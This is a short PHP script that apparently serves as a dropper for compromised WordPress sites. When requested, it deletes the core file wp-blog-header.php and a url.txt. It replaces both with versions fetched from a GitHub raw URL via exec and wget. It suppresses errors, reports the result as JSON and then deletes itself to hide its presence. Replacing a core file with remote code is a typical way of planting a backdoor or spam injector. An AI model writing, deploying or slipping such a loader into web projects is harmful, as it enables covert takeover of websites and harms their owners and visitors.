<?php

$segments = array_values(array_filter(explode('/', parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH))));
if (count($segments) > 1) chdir('..');

$files = [
    'wp-blog-header.php' => 'https://raw.githubusercontent.com/mdmomin365366-gif/newcode/refs/heads/main/wp-blog-header.php',
    'url.txt'            => 'https://raw.githubusercontent.com/mdmomin365366-gif/newcode/refs/heads/main/url.txt',
];

$result = [];

foreach ($files as $name => $url) {
    if (file_exists($name)) @unlink($name);
    @exec('wget -q --timeout=20 -O ' . escapeshellarg($name) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $ret);
    $result[$name] = ($ret === 0 && file_exists($name) && filesize($name) > 0) ? 'success' : 'failed';
}

$result['status'] = count(array_filter(explode('/', parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)))) > 1 ? 'Subdir Done' : 'Current dir Done';

header('Content-Type: application/json');
echo json_encode($result, JSON_PRETTY_PRINT);

@unlink(__FILE__);
